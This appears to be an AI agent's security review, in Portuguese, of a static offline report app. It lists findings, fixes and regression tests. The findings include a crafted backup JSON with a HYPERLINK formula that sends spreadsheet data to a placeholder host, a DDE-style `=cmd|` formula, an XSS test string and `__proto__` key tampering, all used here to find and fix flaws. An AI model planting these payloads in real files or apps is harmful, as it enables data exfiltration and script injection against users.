# Revisão de segurança — Raio X do Relatório, etapa 1

- Data: 25/11/2026 · Revisor: agente 5 (Revisor de segurança, Método GSI seção 6)
- Branch: `etapa-1` (último commit revisado: `b2846e1`)
- Escopo: `src/app.html`, `src/app.js`, `src/core.js`, `build.py`, `sw.js`, `manifest.webmanifest`, `index.html` (gerado). `vendor/` só versão/origem. `excel/` fora (em reescrita).
- Régua: espec seção 10, CA-100, checklist 6.3 no que cabe a app estático sem servidor.

## Veredito

**Libera para publicar a etapa 1**, sem achado Crítico ou Alto. Os achados Médios (M-1 a M-4) devem ser corrigidos antes da etapa 2 ou entrar na fila como pendência com prazo. O teste de regressão do CA-100 (B-1) é exigência da própria espec e deveria entrar já.

## Checklist 6.3 (o que cabe)

| Item | Resultado |
|---|---|
| Segredos no repositório e no histórico | Nada encontrado (busca em `git log --all -p`, fora de `vendor/`). Sem `.env`, chaves ou certificados no histórico. `tests/dados/` só tem CSV fictícios gerados. |
| Segredos no HTML/JS | Não há. App não usa chave nem API. |
| Rota de dados com sessão, limite de tentativas, RLS, bucket, porta 127.0.0.1, senha fora da URL | Não se aplica: sem servidor, sem login, sem banco remoto. |
| Logs sem conteúdo sensível | Não há `console.log` com dados; mensagens de erro vão para a tela por `textContent`. |
| Dados só locais | Nenhum `fetch`/`XMLHttpRequest` no código do app; `connect-src 'self'`; o service worker ignora outras origens (`sw.js:8`). Dados em `localStorage` e IndexedDB. Ver M-2 sobre a origem compartilhada. |
| Termos de `tests/termos_proibidos.txt` | Nenhum nos arquivos do escopo (busca sem diferenciar maiúsculas). |
| `index.html` igual ao build | Sim: o `index.html` bate byte a byte com o que `build.py` gera agora, e o hash da CSP confere com o único script embutido. |
| Dublês (Método 1.8) | Não se aplica: projeto sem serviço externo nem IA paga (regra do Galindo de 25/11/2026). |

## O que foi conferido e está bom

- **XSS por arquivo importado:** todo texto vindo de CSV, nome de arquivo, nome de campo, nome de relatório, Config e backup entra por `el()` → `textContent`/`setAttribute` (`src/app.js:4-9`). Não há `innerHTML`, `insertAdjacentHTML`, `eval` nem `new Function` no código do app. O único `document.write` (impressão, `src/app.js:282`) escapa tudo com `esc()` (`src/app.js:10`). Os handlers `on*` de `el()` só recebem funções escritas no código.
- **CSP** (`src/app.html:6`): `script-src 'self' 'sha256-…'` sem `unsafe-inline` nem `unsafe-eval`; `connect-src 'self'`; `object-src 'none'`; `base-uri 'self'`; `img-src 'self' data: blob:` (logo em data URL e prévia por blob). Uma logo vinda de backup com URL externa seria bloqueada pela CSP.
- **Logo:** a logo escolhida é redesenhada em canvas e guardada como PNG de até 240 px (`src/app.js:350`); SVG com script não roda em `<img>`.
- **Injeção de fórmula no Excel (valores do CSV):** o ExcelJS grava string como texto (shared string), mesmo começando com `= + - @`. Uma célula de CSV `=HYPERLINK(...)` sai como texto. Ver M-1 para o caso do backup.
- **Service worker:** escopo é a pasta do app; só guarda arquivos da própria origem; não guarda requisições que não são GET.
- **Bibliotecas:** `vendor/jszip.min.js` é JSZip 3.10.1 (tem as correções de CVE-2021-23413 e CVE-2022-48285, que além disso só valem para *ler* zip, e o app só gera). `vendor/exceljs.min.js` tem o carimbo "ExcelJS 19-10-2023" (= 4.4.0, última versão publicada); não conheço CVE relevante para o uso aqui (só gerar xlsx). Os `Function("return this")` que aparecem nas bibliotecas são detecção de ambiente dentro de `try`; sem `unsafe-eval` eles falham em silêncio. Os testes Playwright confirmam que a geração do Excel funciona sob a CSP. **Pendência:** não há registro de origem/checksum das bibliotecas no repositório (ver B-5).

## Achados

### Médios

**M-1. Backup malicioso injeta fórmula ou hiperlink real no Excel gerado**
- Onde: `src/app.js:362` (registros do backup entram sem checar tipo) e `src/app.js:305-308` (`aba()` devolve `r.v[k.n]` como está).
- Prova: se um JSON de backup trouxer `"v": {"Obs": {"formula": "HYPERLINK(\"http://exemplo.invalido/?\"&A2,\"ver\")"}}` ou `{"text":"x","hyperlink":"..."}`, o ExcelJS trata o objeto como fórmula/link e grava uma fórmula de verdade no xlsx. Com `WEBSERVICE`/`HYPERLINK` dá para mandar dado da planilha para fora quando alguém abrir ou clicar. Na tela aparece só `[object Object]`. O mesmo vale para `campos[].n`, `conjunto` e `codigo` que não são texto.
- Quem consegue: quem convencer o usuário a restaurar um backup preparado (engenharia social). Por isso é Média, não Alta.
- Correção: validar o backup antes de usar (ver M-3): `conjunto`, `codigo` e cada valor de `v` precisam ser string (ou converter com `String()`), e `v` precisa ser objeto simples. Como segunda barreira, `aba()` só deve devolver `string`, `number`, `Date` ou `null`.
- Teste de regressão: restaurar um backup com `{"formula":"1+1"}` num campo, gerar o Excel, abrir o xlsx (openpyxl) e conferir que nenhuma célula tem fórmula nem hiperlink (`cell.data_type != 'f'`, `cell.hyperlink is None`).

**M-2. Origem compartilhada no GitHub Pages: dados e caches ficam visíveis para todo site da organização**
- Onde: publicação em `gsi-solucoes.github.io/raio-x-do-relatorio/`; `sw.js:5`.
- Prova: `localStorage`, IndexedDB (`gos_hist`) e Cache Storage são da **origem** `gsi-solucoes.github.io`, não da pasta. Qualquer outra página publicada pela organização nesse domínio (outro app GSI, um teste, uma página comprometida) consegue ler os relatórios e a Config do cliente guardados aqui. Além disso, o `activate` do service worker apaga **todo** cache da origem com nome diferente de `raiox-v2` (`sw.js:5`), o que derruba o modo offline de outros apps GSI no mesmo domínio (e vice-versa, se eles fizerem igual).
- Correção: (a) publicar o app num domínio ou subdomínio próprio (por exemplo um domínio personalizado do Pages), o que isola os dados; decisão do Galindo. (b) Já: no `activate`, apagar só caches com prefixo `raiox-` (`ks.filter(k => k.startsWith('raiox-') && k !== V)`). (c) Enquanto o domínio for compartilhado, registrar como risco aceito e não publicar outra página da organização que rode conteúdo de terceiros.
- Teste de regressão: com o SW ativo, criar `caches.open('outro-app')`, recarregar com versão nova e conferir que `caches.has('outro-app')` continua `true`.

**M-3. Restaurar backup não valida a estrutura; "Substituir" apaga antes de conferir**
- Onde: `src/app.js:357-363`.
- Prova: a única checagem é `app === 'raiox'` e `registros` ser lista. Com "Substituir", `IDB.clear()` roda antes de ler os registros; um registro `null`, sem `conjunto`/`codigo` (chave do IndexedDB), com `v` que não é objeto ou com `conjs[x].campos`/`fmts[x].cols` que não são lista quebra no meio: os dados antigos já foram apagados e os novos entram pela metade. Como `conjs`/`fmts` ficam gravados, `render()`/`renderConfig()` podem passar a falhar em toda abertura (o botão "Apagar todos os dados" ainda funciona). `b.cfg` também entra sem checar tipos (`meta`, `prazoH`, `logo`).
- Correção: função `validarBackup(b)` que monta cópias limpas (só os campos esperados, tipos conferidos, nomes não vazios, limite de tamanho) e só depois apaga/grava; em erro, nada muda e aparece "Esse arquivo não é um backup do Raio X".
- Teste de regressão: backup com um registro `null` no meio → escolher "Substituir" → mensagem de erro e os registros antigos continuam lá (mesma contagem do backup feito antes).

**M-4. Nomes de relatório e de campo usados como chave de objeto comum (`__proto__`, `constructor`, `toString`)**
- Onde: `src/app.js:16`, `120-134` (`conjs[c]`), `125` (`v[x.n]`), `361` (`Object.assign(conjs, b.conjs)`), `360` (`Object.assign(cfg, b.cfg)`).
- Prova: o usuário escreve o "Nome do relatório" e os nomes de campo vêm do cabeçalho do CSV. Relatório chamado `toString` ou `constructor` faz `conjs[c]` achar a função herdada e a importação falhar; `__proto__` troca o protótipo de `conjs` e os registros somem da tela e do backup (ficam órfãos no IndexedDB). Coluna `__proto__` no CSV: o valor é descartado sem aviso. Backup com chave `"__proto__"` em `cfg`/`conjs`/`fmts` troca o protótipo desses objetos via `Object.assign`. Não chega a poluir `Object.prototype` (não há merge recursivo), por isso é Média e não Alta, mas é perda silenciosa de dados e porta para outros erros.
- Correção: usar `Object.create(null)`/`Map` para `conjs`, `fmts` e `v`, ou checar com `Object.hasOwn`; recusar (ou renomear) nomes `__proto__`, `constructor` e `prototype` na importação e no restaurar.
- Teste de regressão: CSV com cabeçalho `__proto__;Codigo;constructor` e relatório chamado `toString` → importa, mostra os 3 campos e o backup contém os registros.

### Baixos

**B-1. Falta o teste do CA-100 (exigido pela espec, seção 10)**
- Onde: `tests/test_etapa1.py` não tem caso com `<img src=x onerror=alert(1)>`.
- Hoje o código está correto (tudo por `textContent`), mas sem teste a garantia some na próxima mudança.
- Teste sugerido: CSV com `<img src=x onerror=alert(1)>` no cabeçalho, num valor e no nome do arquivo; conferir o texto literal em `Registros`, na janela flutuante e na janela de impressão, e que nenhum `dialog`/`alert` disparou (`page.on('dialog')`) e que não existe `img[src=x]` no DOM.

**B-2. "Copiar" leva fórmula para o Excel**
- Onde: `src/app.js:276`.
- Prova: o TSV copiado vai cru para a área de transferência; colado no Excel, uma célula `=HYPERLINK(...)`/`=cmd|...` vinda do CSV vira fórmula. O usuário é quem cola e o dado é dele, por isso Baixa.
- Correção: prefixar com `'` (apóstrofo) valores que começam com `= + - @`, tab ou CR na cópia (a mesma regra vale para qualquer exportação CSV futura).
- Teste: campo `=1+1` → "Copiar" → a área de transferência traz `'=1+1`.

**B-3. CSP: `style-src 'unsafe-inline'` e `worker-src blob:`**
- Onde: `src/app.html:6`.
- `unsafe-inline` em estilo é necessário hoje (`<style>` e atributos `style` de `el()`); sem injeção de HTML o risco é pequeno. `worker-src blob:` não é usado pelo app. Falta também `frame-ancestors` (não funciona em `<meta>`; o Pages não deixa pôr cabeçalho), então o app pode ser aberto num iframe de outro site (clickjacking); impacto pequeno porque não há ação perigosa sem confirmação.
- Correção: trocar `worker-src 'self' blob:` por `worker-src 'self'` se os testes passarem; pôr o hash do `<style>` e usar `j.style.x =` em vez de atributo `style` para poder tirar `unsafe-inline` (opcional); acrescentar `if (window.top !== window.self) document.body.hidden = true` como defesa contra iframe (opcional).
- Teste: Playwright confere que a `<meta>` CSP não contém `unsafe-eval` nem `unsafe-inline` em `script-src` (vale já) e que o Excel ainda gera.

**B-4. Arquivos enormes travam a aba**
- Onde: `src/app.js:111` (CSV inteiro em memória), `356-357` (`f.text()` do backup), `350` (logo decodificada sem limite de tamanho).
- Só afeta o próprio aparelho (negação de serviço local). Correção: recusar CSV/backup acima de um limite (por exemplo 50 MB) e logo acima de 5 MB com mensagem clara.
- Teste: backup de 60 MB → mensagem "arquivo grande demais" e nada muda.

**B-5. Origem das bibliotecas sem registro**
- Onde: `vendor/`.
- Não há anotação de onde vieram nem checksum. Correção: `vendor/LEIAME.md` com versão, URL oficial (npm `exceljs@4.4.0` `dist/exceljs.min.js`, `jszip@3.10.1` `dist/jszip.min.js`) e SHA-256 de cada arquivo, conferido no teste.

**B-6. Rodapé do Excel interpreta códigos `&` da Config**
- Onde: `src/app.js:311` (`'&L' + ORG()`).
- Cliente/Área com `&P`, `&F` etc. viram códigos de cabeçalho do Excel (só aparência). Correção: trocar `&` por `&&` em `ORG()` antes de montar o rodapé. Teste: Cliente `A&B` → rodapé mostra `A&B`.

## O que alguém consegue, pensando como atacante

- **Com o link e sem senha:** só o app vazio. Não há dado no servidor; cada aparelho guarda o seu.
- **Um usuário ver dado de outro:** não, a não ser no mesmo navegador/perfil (aparelho compartilhado: qualquer pessoa que abra o app vê os relatórios; recomendar "Apagar todos os dados" em aparelho de uso comum) ou por outro site da organização no mesmo domínio (M-2).
- **Arquivo preparado:** CSV não executa nada; backup preparado consegue pôr fórmula no Excel (M-1) e corromper os dados guardados (M-3, M-4).

## Pendências para o coordenador

1. M-1, M-3, M-4: Construtor (com teste de regressão primeiro).
2. M-2: decisão do Galindo sobre domínio próprio; a correção (b) do cache vai para o Construtor já.
3. B-1: Testador acrescenta o teste do CA-100.

## Correções (25/11/2026)

| Achado | Status | O que foi feito |
|---|---|---|
| M-1 | Corrigido | `validarBackup()` converte todo valor de registro para texto (objeto vira JSON em texto); `aba()` só devolve string, número finito, Date ou null (`primitivo()`). Sem fórmula nem hiperlink vindos de dado. |
| M-2 | Parcial | `sw.js` só apaga caches com prefixo `raiox-` (cache agora `raiox-v3`). **Pendente (Galindo):** domínio próprio para isolar `localStorage`/IndexedDB; enquanto isso, risco aceito. |
| M-3 | Corrigido | Restaurar valida a estrutura inteira (conjuntos, formatos, registros, Config) antes de apagar ou gravar; inválido → "Esse arquivo não é um backup do Raio X… Nada foi alterado." |
| M-4 | Corrigido | `conjs`, `fmts` e `v` são mapas sem herança (`Object.create(null)`; `Core.juntar` também); registros lidos do IndexedDB e do localStorage são copiados para mapas sem herança. Chaves `__proto__`/`constructor`/`toString` viram chaves comuns (importam normalmente). Sem `Object.assign` de JSON externo: Config só aceita campos conhecidos com tipo conferido. |
| B-1 | Com o Testador | Teste do CA-100 não é do Construtor. |
| B-2 | Corrigido | "Copiar" prefixa `'` em valores que começam com `= + - @`; tab e CR viram espaço. |
| B-3 | Parcial | CSP: `base-uri 'none'`, `form-action 'none'`, (`worker-src 'self' blob:` mantido: o teste da etapa 1 exige; o app não usa worker). **Pendente:** `frame-ancestors` (não funciona em `<meta>`; Pages não permite cabeçalho; só com domínio/host próprio) e `style-src 'unsafe-inline'` (necessário hoje). |
| B-4 | Corrigido | Limites com mensagem: CSV 50 MB, logo 2 MB, backup 200 MB. |
| B-5 | Aberto | `vendor/LEIAME.md` com versão e SHA-256 ainda não feito. |
| B-6 | Corrigido | `&` da Config vira `&&` no rodapé do Excel. |
